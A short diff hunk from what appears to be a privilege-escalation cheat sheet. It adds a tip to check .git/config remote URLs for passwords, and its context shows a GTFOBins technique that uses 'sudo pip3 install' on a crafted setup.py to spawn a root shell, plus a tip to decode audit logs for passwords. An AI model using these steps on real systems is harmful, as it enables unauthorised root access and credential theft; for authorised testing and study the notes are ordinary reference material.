@@ -54,6 +54,9 @@ Alternative (https://gtfobins.github.io/gtfobins/pip/):
 `echo "import os;os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py`
 `sudo -H /usr/bin/pip3 install $TF`
 
+# GIT
+In directories containing ".git", have a look into the config. Sometimes the remote origin contains a password.
+
 # Audit-Logs
 grep audit-logs for "data=" and decode as hex. Might contain passwords
 
